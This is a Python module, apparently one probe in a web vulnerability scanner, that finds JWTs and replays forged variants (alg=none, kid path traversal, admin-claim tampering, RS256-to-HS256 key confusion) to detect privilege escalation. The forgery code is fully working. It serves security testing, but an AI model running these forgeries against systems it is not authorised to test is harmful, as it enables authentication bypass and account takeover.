"""JWT privilege escalation probe.

For every JWT we observe in cookies / Authorization headers / response
bodies, this scanner constructs forged variants and replays the
original request with each variant. If the forged variant succeeds where
an unauthenticated request would fail, we have a privilege escalation
bug.

Forgery shapes:
  1. **alg=none** — strip signature, rewrite header to {alg:'none'}.
     Still defeats some libraries that whitelist 'none' for testing.
  2. **HS256-with-RSA-public-key confusion** — when the original token is
     RS256 and the JWK / public key is fetchable, sign a tampered
     payload with HS256 using the PEM as the secret.
  3. **Claim tampering** — flip `role`, `is_admin`, `tenant`, `user_id`
     to elevated values without touching the signature; some
     implementations forget to verify after parsing.
  4. **kid traversal** — set `kid: "../../dev/null"` and sign with empty
     bytes (some libs read the file at kid and compute HMAC over that).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from typing import TYPE_CHECKING
from urllib.parse import urlparse

if TYPE_CHECKING:
    from core.orchestrator import Context

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]{8,}")


def _b64u_enc(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def _b64u_dec(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _decompose(token: str) -> tuple[dict, dict, str] | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        return json.loads(_b64u_dec(parts[0])), json.loads(_b64u_dec(parts[1])), parts[2]
    except Exception:
        return None


def _none_alg(header: dict, payload: dict) -> str:
    h = dict(header); h["alg"] = "none"
    return f"{_b64u_enc(json.dumps(h, separators=(',', ':')).encode())}." \
           f"{_b64u_enc(json.dumps(payload, separators=(',', ':')).encode())}."


def _kid_traversal(header: dict, payload: dict) -> str:
    h = dict(header); h["alg"] = "HS256"; h["kid"] = "../../../../dev/null"
    p = json.dumps(payload, separators=(",", ":")).encode()
    head = _b64u_enc(json.dumps(h, separators=(",", ":")).encode())
    body = _b64u_enc(p)
    sig = hmac.new(b"", f"{head}.{body}".encode(), hashlib.sha256).digest()
    return f"{head}.{body}.{_b64u_enc(sig)}"


def _tamper_claims(header: dict, payload: dict) -> tuple[dict, str]:
    p = dict(payload)
    elevated = {}
    for k in list(p.keys()):
        kl = k.lower()
        if kl in ("role", "roles", "is_admin", "isadmin", "admin",
                  "scope", "scopes", "permission", "permissions"):
            old = p[k]; p[k] = "admin" if isinstance(old, str) else True
            elevated[k] = (old, p[k])
    if not elevated:
        # add new claims that backends sometimes honour
        p["role"] = "admin"; p["is_admin"] = True
        elevated["role"] = (None, "admin"); elevated["is_admin"] = (None, True)
    head_b = _b64u_enc(json.dumps(header, separators=(",", ":")).encode())
    body_b = _b64u_enc(json.dumps(p, separators=(",", ":")).encode())
    return elevated, f"{head_b}.{body_b}.invalidsig"


def _rsa_pem_from_jwk(n_b64: str, e_b64: str) -> str | None:
    """Build a PEM public key from JWKS RSA (n, e) for the RS256→HS256
    algorithm-confusion attack (the PEM bytes are used as the HMAC secret)."""
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        n = int.from_bytes(_b64u_dec(n_b64), "big")
        e = int.from_bytes(_b64u_dec(e_b64), "big")
        pub = rsa.RSAPublicNumbers(e, n).public_key()
        return pub.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        ).decode()
    except Exception:
        return None


def _hs256_with_secret(header: dict, payload: dict, secret: str) -> str:
    h = dict(header); h["alg"] = "HS256"
    head = _b64u_enc(json.dumps(h, separators=(",", ":")).encode())
    body = _b64u_enc(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{head}.{body}".encode(), hashlib.sha256).digest()
    return f"{head}.{body}.{_b64u_enc(sig)}"


async def _fetch_jwks(ctx: "Context", base: str) -> list[str]:
    """Fetch RSA public keys (as PEM) from the standard JWKS location."""
    from urllib.parse import urljoin
    for path in ("/.well-known/jwks.json", "/.well-known/openid-configuration/jwks"):
        ev = await ctx.http.get(urljoin(base, path))
        if ev.status != 200:
            continue
        try:
            doc = json.loads(ev.response_body or "{}")
        except Exception:
            continue
        if "jwks_uri" in doc:
            ev = await ctx.http.get(doc["jwks_uri"])
            if ev.status != 200:
                continue
            try:
                doc = json.loads(ev.response_body or "{}")
            except Exception:
                continue
        pems = []
        for k in (doc.get("keys") or []):
            if k.get("kty") == "RSA" and k.get("n") and k.get("e"):
                pem = _rsa_pem_from_jwk(k["n"], k["e"])
                if pem:
                    pems.append(pem)
        if pems:
            return pems
    return []


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    # locate the token in the live response — cookies + body
    ev = await ctx.http.get(url)
    blob = (ev.response_body or "") + " " + (ev.response_headers.get("set-cookie") or "")
    candidates = list({m for m in JWT_RE.findall(blob)})
    # also pull from session-attached headers (Authorization: Bearer ...)
    sess_auth = (ctx.session.headers.get("Authorization") if ctx.session else "") or ""
    if sess_auth.lower().startswith("bearer "):
        candidates.append(sess_auth.split(None, 1)[1])
    candidates = list({c for c in candidates if c})
    if not candidates:
        return findings

    # baseline — what does an unauthenticated request return?
    ev_anon = await ctx.http.get(
        url, headers={"Authorization": ""}, cookies={"session": ""},
    )
    anon_status = ev_anon.status
    anon_size = len(ev_anon.response_body or "")

    for token in candidates[:3]:
        decomposed = _decompose(token)
        if not decomposed:
            continue
        header, payload, _ = decomposed

        # RS256→HS256 algorithm confusion: sign with the PUBLIC key as an
        # HMAC secret (the classic JWT confusion attack) when JWKS is exposed
        if (header.get("alg") or "").upper() in ("RS256", "RS384", "RS512"):
            base = urlparse(url)
            pems = await _fetch_jwks(ctx, f"{base.scheme}://{base.netloc}")
            for pem in pems[:3]:
                conf_token = _hs256_with_secret(header, payload, pem)
                ev_c = await ctx.http.get(
                    url, headers={"Authorization": f"Bearer {conf_token}"},
                )
                if ev_c.status == 200 and len(ev_c.response_body or "") > 200 \
                        and (anon_status in (401, 403) or anon_size < 200):
                    from core.poc import proof_record
                    poc = proof_record(
                        verified=True, method="GET", url=url,
                        request=f"GET {url}\nAuthorization: Bearer {conf_token[:120]}…",
                        status=ev_c.status, excerpt=ev_c.response_body,
                        rationale=("A token signed with HS256 using the server's OWN public "
                                   "key (fetched from JWKS) as the HMAC secret was accepted — "
                                   "the verifier trusts the attacker-controlled `alg` header "
                                   "(RS256→HS256 confusion, full signature forgery)."))
                    findings.append({
                        "category": "api",
                        "title": "JWT algorithm confusion — RS256→HS256 public-key forgery accepted",
                        "severity": "critical", "cvss": 9.8,
                        "url": url, "parameter": "Authorization",
                        "payload": conf_token[:120] + "…",
                        "evidence": "A forged HS256 token signed with the server's public key "
                                    f"returned 200 ({len(ev_c.response_body or '')}B) while the "
                                    f"anonymous request returned {anon_status}/{anon_size} — "
                                    "attacker-controlled alg header enables signature forgery.",
                        "request": f"GET {url}\nAuthorization: Bearer {conf_token[:120]}…",
                        "response": (ev_c.response_body or "")[:1500],
                        "metadata": {"forgery": "rs256_hs256_confusion",
                                     "poc": poc},
                    })
                    break

        forged_variants = [
            ("alg=none",        _none_alg(header, payload)),
            ("kid traversal",   _kid_traversal(header, payload)),
        ]
        elevated, claim_token = _tamper_claims(header, payload)
        forged_variants.append(("claim tampering — invalid sig", claim_token))

        for label, ftoken in forged_variants:
            ev_f = await ctx.http.get(
                url, headers={"Authorization": f"Bearer {ftoken}"},
            )
            if ev_f.status == 200 and len(ev_f.response_body or "") > 200:
                # only flag if forged works AND anon didn't
                if anon_status in (401, 403) or anon_size < 200:
                    findings.append({
                        "category": "api",
                        "title": f"JWT privilege escalation via {label}",
                        "severity": "critical", "cvss": 9.8,
                        "url": url, "parameter": "Authorization",
                        "payload": ftoken,
                        "evidence": f"Forged JWT ({label}) returned 200 with "
                                    f"{len(ev_f.response_body or '')} bytes; anonymous "
                                    f"request returned {anon_status}/{anon_size} bytes. "
                                    "Signature verification is bypassable.",
                        "request": f"GET {url}\nAuthorization: Bearer {ftoken}",
                        "response": (ev_f.response_body or "")[:1500],
                        "metadata": {"forgery": label,
                                     "claim_changes": elevated if "claim" in label else {}},
                    })
                    break  # one confirmed forgery per token is enough
    return findings
